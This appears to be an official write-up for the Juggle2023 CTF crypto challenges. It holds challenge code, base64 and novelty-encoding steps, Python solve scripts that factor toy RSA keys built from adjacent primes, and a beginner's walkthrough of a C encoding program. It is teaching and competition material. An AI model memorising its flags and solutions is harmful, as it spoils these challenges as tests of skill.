<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h4 id="第一周-2"><a href="#第一周-2" class="headerlink" title="第一周"></a>第一周</h4><h5 id="baby-crypto"><a href="#baby-crypto" class="headerlink" title="baby_crypto"></a>baby_crypto</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点：base64 栅栏密码</span><br></pre></td></tr></table></figure>

<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里有一串字符串 你知道是什么吗 </span><br><span class="line">ZmVfZTBsbGpfMmFDdWMzZzBndH17bWdmQHdlMTJA</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=Wm1WZlpUQnNiR3BmTW1GRGRXTXpaekJuZEgxN2JXZG1RSGRsTVRKQQ">赛博厨子</a>加随波逐流直接秒 </p>
<p><img src="/./Juggle2023-%E5%AE%98%E6%96%B9wp/img/img16.png" alt="17"></p>
<p>或者赛博厨子加<a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/railfence">栅栏加密&#x2F;解密 - Bugku CTF</a></p>
<p><img src="/././Juggle2023-%E5%AE%98%E6%96%B9wp/img/img17.png"></p>
<h5 id="猫学姐"><a href="#猫学姐" class="headerlink" title="猫学姐"></a>猫学姐</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点:密码经典奇奇怪怪的编码and套娃(别骂了别骂了..ToT</span><br></pre></td></tr></table></figure>

<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://dikio3o.top/Juggle2023/fj/o.O.txt</span><br><span class="line"></span><br><span class="line">// 如果有乱码就用火狐浏览器开然后修复编码就好 放到2024.6月份,会放在学校赛库里~</span><br></pre></td></tr></table></figure>



<p>步骤一: <a target="_blank" rel="noopener" href="https://www.zdjd.asia/">尊嘟假嘟翻译器</a></p>
<p>步骤二:<a target="_blank" rel="noopener" href="https://roar.iiilab.com/">兽语翻译器</a></p>
<p>步骤三:<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">ook解码</a></p>
<h5 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点: 密码RSA</span><br></pre></td></tr></table></figure>

<p>题:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line">from flag import secret</span><br><span class="line"></span><br><span class="line">p = getPrime(2048)</span><br><span class="line">q = gmpy2.next_prime(p)</span><br><span class="line">n = p * q</span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line">flag = b&#x27;flag&#123;this_fake_flag&#125;&#x27;</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = pow(m,e,n)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"># print(n)</span><br><span class="line"># print(c)</span><br><span class="line"></span><br><span class="line"># 519102774189919266970300088206784042325369675219928872075656111134910584266176811163696371765747142679073348397333286690614644819019529354853206508068751223678990131079949593850812977672673464453065835594661276608183800798109146074411663911097813158378837116145719824053916045910024864070628242701267327209413602382011301113650310599958931866498921650181619014396719262503458501934705643304223355346636276569839428049473557988808604297260795592908176270785227731229288745995814555503433203818759566464934745524681406806244540269087013043037657932711146156032347247560641374244261423680409065249543855543923157098714862674343562431970830116004975368903862920574007458448248084617324701631145439042114999172867794381529185827827774180786177905262552770021348684730889192223740970284448379526962924156087055278807752780943110558968592929005637350163562962439539689279002007660442431892888595092684393392654693341816687505111576916640076579970747857392481924734194179841594091127647202732420648021136326949240860241926811670100657048835765204830759143575971656442757707885942763689993616192023032848186476929972081251535296185216516497238407120571949198443691296987580824210308877712476781228935016051083222566342325638559022023257103591</span><br><span class="line"># 290757796030201130039776640724582263254552710933195813632036080342239593062397135238787180660004363946858967612379785101417404331661714692704545923067768011643656282872141085036841827214047827662475097759977155024770821320386228872814163097771338234279963589919353010324752224461133271337226473228064050024399498292883001323710150948037005686917818300384760748692226164048380695822461482238095469768697389050174806823243630549481835694870784440202384645728574610735071093518778750368111823629886611329087224547463459295575446942805374036617959666869893412819002531783601093809007346097955824623347129081301889201236041446890065616172262342550238402090721277845674489936588832769646932085673128872783663877816439361860803932341762734081062791382222243423448390942013927320497999514340826069247453047576861888631736399350146043427466802406813332726537760915556287477708885076137851723241920656123743523261878091189944809914733179082199877542939807336616169751981713689495670050978903986071541841715880160062844156507070455246718808990998804228067931738524641170093794658359398675757840328531128937712776578322897652732234389634282379673174416580175057125714809095903354849007576280298368137252402520457709393322386452437959312929713067</span><br></pre></td></tr></table></figure>



<p>emm…(RSA我出完题就忘了差不多了dbq&gt;&lt;…同学们以我为戒..要一直学才行不要学一会觉得会了就不学…)，由于时间原因我就先留个坑了..实在没时间重新逛一遍RSA了..这里就借用学弟的wp了</p>
<p>exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line">n =519102774189919266970300088206784042325369675219928872075656111134910584266176811163696371765747142679073348397333286690614644819019529354853206508068751223678990131079949593850812977672673464453065835594661276608183800798109146074411663911097813158378837116145719824053916045910024864070628242701267327209413602382011301113650310599958931866498921650181619014396719262503458501934705643304223355346636276569839428049473557988808604297260795592908176270785227731229288745995814555503433203818759566464934745524681406806244540269087013043037657932711146156032347247560641374244261423680409065249543855543923157098714862674343562431970830116004975368903862920574007458448248084617324701631145439042114999172867794381529185827827774180786177905262552770021348684730889192223740970284448379526962924156087055278807752780943110558968592929005637350163562962439539689279002007660442431892888595092684393392654693341816687505111576916640076579970747857392481924734194179841594091127647202732420648021136326949240860241926811670100657048835765204830759143575971656442757707885942763689993616192023032848186476929972081251535296185216516497238407120571949198443691296987580824210308877712476781228935016051083222566342325638559022023257103591</span><br><span class="line"></span><br><span class="line">c =290757796030201130039776640724582263254552710933195813632036080342239593062397135238787180660004363946858967612379785101417404331661714692704545923067768011643656282872141085036841827214047827662475097759977155024770821320386228872814163097771338234279963589919353010324752224461133271337226473228064050024399498292883001323710150948037005686917818300384760748692226164048380695822461482238095469768697389050174806823243630549481835694870784440202384645728574610735071093518778750368111823629886611329087224547463459295575446942805374036617959666869893412819002531783601093809007346097955824623347129081301889201236041446890065616172262342550238402090721277845674489936588832769646932085673128872783663877816439361860803932341762734081062791382222243423448390942013927320497999514340826069247453047576861888631736399350146043427466802406813332726537760915556287477708885076137851723241920656123743523261878091189944809914733179082199877542939807336616169751981713689495670050978903986071541841715880160062844156507070455246718808990998804228067931738524641170093794658359398675757840328531128937712776578322897652732234389634282379673174416580175057125714809095903354849007576280298368137252402520457709393322386452437959312929713067</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = 65537</span><br><span class="line">temp = gmpy2.iroot(n,2)[0]</span><br><span class="line">p = gmpy2.next_prime(temp)</span><br><span class="line">q = n // p</span><br><span class="line">phi = (p -1) * (q - 1)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>



<p>ezRSA</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点：伪随机种子seed 位移RSA</span><br></pre></td></tr></table></figure>

<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line">import random</span><br><span class="line">from secret import flag</span><br><span class="line"></span><br><span class="line">def generate_prime():</span><br><span class="line">    seed = random.getrandbits(128)</span><br><span class="line">    random.seed(seed)</span><br><span class="line">    cancanneed = getPrime(2048)</span><br><span class="line">    while True:</span><br><span class="line">        cancanneed += random.getrandbits(64)</span><br><span class="line">        if isPrime(cancanneed):</span><br><span class="line">            return cancanneed</span><br><span class="line"></span><br><span class="line">p = generate_prime()</span><br><span class="line">q = gmpy2.next_prime(p)</span><br><span class="line">n = p * q</span><br><span class="line">e = 65537</span><br><span class="line">flag = b&#x27;flag&#123;this_is_fake_flag!!&#125;&#x27;</span><br><span class="line"># print(p)</span><br><span class="line"># print(q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加左位移和伪随机</span><br><span class="line">shift_amount = random.randint(1, 8)</span><br><span class="line">m = bytes_to_long(flag) &lt;&lt; shift_amount</span><br><span class="line">c = pow(m, e, n)</span><br><span class="line"># print(c)</span><br><span class="line"></span><br><span class="line"># 24646988488139369306743472563392198227409234931921683701345734322622719518210354375211971261206417724722624925560761490954182981854466716532947048174879636532167196779026487817167488350395630349236929611773346321475312458718106003129424349224972360747380414987072356771926589960258685966309042783456302199229327533872157454254487612041943233154706945141395985817306885225846964346185993823048912489572612188590171715953016916836140052893646862586974880884784240792756968114671787076707911492108001799410554571696173362821009162892427850953479567822234153123623549740169531489249572261252915188509807078923343035237261</span><br><span class="line"># 24646988488139369306743472563392198227409234931921683701345734322622719518210354375211971261206417724722624925560761490954182981854466716532947048174879636532167196779026487817167488350395630349236929611773346321475312458718106003129424349224972360747380414987072356771926589960258685966309042783456302199229327533872157454254487612041943233154706945141395985817306885225846964346185993823048912489572612188590171715953016916836140052893646862586974880884784240792756968114671787076707911492108001799410554571696173362821009162892427850953479567822234153123623549740169531489249572261252915188509807078923343035239307</span><br><span class="line"># 56513281182272383267202426847151770163159167123476155666203967562061059352880032798514076833269356780582622827609847232011583138908220304196696796312411611993582964790604510982737333797229685666672159974146013859128835065288810814995657446576311229145334850701743538646024707163709474615397966359935709818248617648186738097247909712031306657795208830117501911743362486672218533746468546837880373748667867439043892845776635827058708074566876675900708338954552649537801184409754105778196765144971470495717244631683732848207343438018252132041805681198784020746859953506858131006694056428304357243919635770579291265748249418221498586220884805582780658864248096795630678348787930521988815727224615111562628248011175060955270069081183657198405215812196035754736238491226941155626770686611796994378555871573141633858929935004200380133880905062029628163093046979952959690081000405564376155620441141172391510780260923716023737879423085844365329515455027992315821209684693358614628577529211070323508073314754504716041126590743611592635115375521580088143790895411975164504001715932795939645504937601629590632785002607057515775635274155141987104591711745922952749263285031295576361293356372256322509158491501257781584234815538368819253506634933</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>同上，有不理解的感兴趣大家可以去骚扰你们的刘学长~ </p>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line">import random</span><br><span class="line">p =24646988488139369306743472563392198227409234931921683701345734322622719518210354375211971261206417724722624925560761490954182981854466716532947048174879636532167196779026487817167488350395630349236929611773346321475312458718106003129424349224972360747380414987072356771926589960258685966309042783456302199229327533872157454254487612041943233154706945141395985817306885225846964346185993823048912489572612188590171715953016916836140052893646862586974880884784240792756968114671787076707911492108001799410554571696173362821009162892427850953479567822234153123623549740169531489249572261252915188509807078923343035237261</span><br><span class="line">q =24646988488139369306743472563392198227409234931921683701345734322622719518210354375211971261206417724722624925560761490954182981854466716532947048174879636532167196779026487817167488350395630349236929611773346321475312458718106003129424349224972360747380414987072356771926589960258685966309042783456302199229327533872157454254487612041943233154706945141395985817306885225846964346185993823048912489572612188590171715953016916836140052893646862586974880884784240792756968114671787076707911492108001799410554571696173362821009162892427850953479567822234153123623549740169531489249572261252915188509807078923343035239307</span><br><span class="line">c =56513281182272383267202426847151770163159167123476155666203967562061059352880032798514076833269356780582622827609847232011583138908220304196696796312411611993582964790604510982737333797229685666672159974146013859128835065288810814995657446576311229145334850701743538646024707163709474615397966359935709818248617648186738097247909712031306657795208830117501911743362486672218533746468546837880373748667867439043892845776635827058708074566876675900708338954552649537801184409754105778196765144971470495717244631683732848207343438018252132041805681198784020746859953506858131006694056428304357243919635770579291265748249418221498586220884805582780658864248096795630678348787930521988815727224615111562628248011175060955270069081183657198405215812196035754736238491226941155626770686611796994378555871573141633858929935004200380133880905062029628163093046979952959690081000405564376155620441141172391510780260923716023737879423085844365329515455027992315821209684693358614628577529211070323508073314754504716041126590743611592635115375521580088143790895411975164504001715932795939645504937601629590632785002607057515775635274155141987104591711745922952749263285031295576361293356372256322509158491501257781584234815538368819253506634933</span><br><span class="line">e = 65537</span><br><span class="line">n = p * q</span><br><span class="line">temp = gmpy2.iroot(n,2)[0]</span><br><span class="line">p = gmpy2.next_prime(temp)</span><br><span class="line">q = n // p</span><br><span class="line">phi = (p -1) * (q - 1)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">for _ in range(10):</span><br><span class="line">    shift_amount = random.randint(1, 8)</span><br><span class="line">    flag = m &gt;&gt; shift_amount</span><br><span class="line">    print(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>



<h2 id="特别篇-enCode"><a href="#特别篇-enCode" class="headerlink" title="特别篇:enCode"></a>特别篇:enCode</h2><blockquote>
<p>阅读并理解以下内容至少需要半个小时，请耐心阅读并理解</p>
</blockquote>
<h3 id="原题代码"><a href="#原题代码" class="headerlink" title="原题代码"></a>原题代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> code;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;Arr;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Traverse</span><span class="params">(Arr* arr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (arr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, arr-&gt;code);</span><br><span class="line">        arr = arr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Encode</span><span class="params">(Arr* arr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (arr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        arr-&gt;code = arr-&gt;code &lt; <span class="number">100</span> ? arr-&gt;code + <span class="number">200</span> : arr-&gt;code + <span class="number">30</span>;</span><br><span class="line">        arr = arr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Decode</span><span class="params">(Arr* arr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (arr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        arr-&gt;code = arr-&gt;code &gt; <span class="number">200</span> ? arr-&gt;code - <span class="number">200</span> : arr-&gt;code - <span class="number">30</span>;</span><br><span class="line">        arr = arr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Translation</span><span class="params">(Arr* arr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (arr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, arr-&gt;code);</span><br><span class="line">        arr = arr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// flag: 132138297133153267141140133144297146147138297146131295285233155</span></span><br><span class="line">    <span class="type">char</span> ch = <span class="number">0</span>;</span><br><span class="line">    Arr* encode = (Arr*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Arr));</span><br><span class="line">    Arr* p = encode;</span><br><span class="line">    <span class="keyword">while</span> ((ch = getchar()) != <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Arr* newNode = (Arr*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Arr));</span><br><span class="line">        newNode-&gt;code = ch;</span><br><span class="line">        newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        p-&gt;next = newNode;</span><br><span class="line">        p = newNode;</span><br><span class="line">    &#125;</span><br><span class="line">    Arr* out = encode-&gt;next;</span><br><span class="line">    Encode(out);</span><br><span class="line">    Traverse(out);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="精简版代码"><a href="#精简版代码" class="headerlink" title="精简版代码"></a>精简版代码</h3><p>上面的代码其实有几个代码函数没有用，所以这里简化一下，就看起来没那么累。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> code;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;Arr;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Traverse</span><span class="params">(Arr* arr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (arr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, arr-&gt;code);</span><br><span class="line">        arr = arr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Encode</span><span class="params">(Arr* arr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (arr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        arr-&gt;code = arr-&gt;code &lt; <span class="number">100</span> ? arr-&gt;code + <span class="number">200</span> : arr-&gt;code + <span class="number">30</span>;</span><br><span class="line">        arr = arr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// flag: 132138297133153267141140133144297146147138297146131295285233155</span></span><br><span class="line">    <span class="type">char</span> ch = <span class="number">0</span>;</span><br><span class="line">    Arr* encode = (Arr*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Arr));</span><br><span class="line">    Arr* p = encode;</span><br><span class="line">    <span class="keyword">while</span> ((ch = getchar()) != <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Arr* newNode = (Arr*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Arr));</span><br><span class="line">        newNode-&gt;code = ch;</span><br><span class="line">        newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        p-&gt;next = newNode;</span><br><span class="line">        p = newNode;</span><br><span class="line">    &#125;</span><br><span class="line">    Arr* out = encode-&gt;next;</span><br><span class="line">    Encode(out);</span><br><span class="line">    Traverse(out);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>核心：在解题的时候，首先要进行观察，抓住所有细节，就像数学题一样，题目的条件不会白给，给的条件一定会用上，这是解题的关键，不仅仅是解ctf题，在未来学习的过程中也一定要抓住每个细节，思考它存在的意义。（这道题忘记把其他没用的代码删掉了）</p>
<h4 id="观察"><a href="#观察" class="headerlink" title="观察"></a>观察</h4><p>先大致浏览一下代码，可以发现是C语言的代码，看一下有没有什么特殊之处，可以发现有encode和decode的字样，大概猜测一下应该是一道加解密的题目，并且在main函数中，给出了一个注释，由于flag的结果是<code>flag&#123;xxx&#125;</code>这种形式的，而这里注释并不是这种形式，所以提交<code>flag&#123;132138297133153267141140133144297146147138297146131295285233155&#125;</code>肯定是错的，猜测一下，这些数字应该是加密后的结果，接下来就需要阅读代码并且找到这串密文是否有规律。</p>
<p>阅读代码</p>
<p>读代码是一项技术活，需要大概看一下代码的结构，大致猜测这些代码是做什么用途的，猜到这是加解密的代码，那么接下来就带着加解密的思路来阅读代码。<br>每个程序都有一个入口，也就是代码从这个入口开始执行，对于C语言的代码是main函数，同样对于Java这种语言，程序入口也是main函数，python这种脚本语言则没有入口，直接从上往下执行。<br>主函数首先定义了一些变量，像<code>malloc()</code>这种是函数，不知道怎么用的话可以上网查一下用法（其实核心并不是在这，这只是数据结构中的一点内容，并不是核心加密算法），后面看到while循环，并且调用了<code>getchar()</code>函数，这个和上面一样，不懂就上网查，发现这是一个接受输入的函数（那么具体的用法可以上网查了之后自己建一个小的C语言代码试一下怎么用，调用之后观察输出），并且后面跟了一个<code>!= &#39;\n&#39;</code>的条件，也就是回车以后跳出while循环，这时候可以尝试运行一下这段代码。运行后发现是一个小黑窗什么都没有，聪明一点的人应该这时候会随便乱按键盘，发现可以输入内容，然后回车，发现出现了一串数字，然后再运行一次，再随便敲一下键盘，发现又出现了一串数字，那么这时候应该知道while循环这一行代码是在等待用户输出内容，并且以回车结束。再仔细阅读一下while循环中的代码，发现看不懂，并且有很多符号箭头什么的，这时候跳过看看其他地方有没有什么特别的地方。<br>这时候看到下面有个<code>Encode()</code>函数，上网查一下发现这个函数的中文是加密的意思，然后突然想起来开始大致浏览代码的时候，其他地方也有个<code>Encode()</code>函数，这时候找到另一个有这个函数的地方，发现是<code>Encode()</code>的定义。<br>猜测一下，这个是不是加密的核心代码（题外话：如果想要成为一个技术很强的人，要学会去猜测，学会产生好奇心，并且试图用各种方法寻找答案）。发现这个函数中出现了加减运算，再猜测一下这个运算是不是和flag那一串数字有关，先将代码备份一份，再修改一下这个数字看看有啥用。<br>首先先运行没改动的代码，输入”abc”这个字符串，发现输出的内容是”297298299”，那么这时候将数字随便改动一下，把第一个100改为200试试看，发现内容还是”297298299”，再把第一个改回来，把第二个200改为100，同样输入”abc”，发现输出的内容变为了”197198199”，这时候应该醒悟到，这段代码就是影响加密结果的核心代码，那么这些代码又有什么意思呢？（除了更改数字这样试，还可以通过打断点调试的方式来了解这段代码每个步骤的用途）</p>
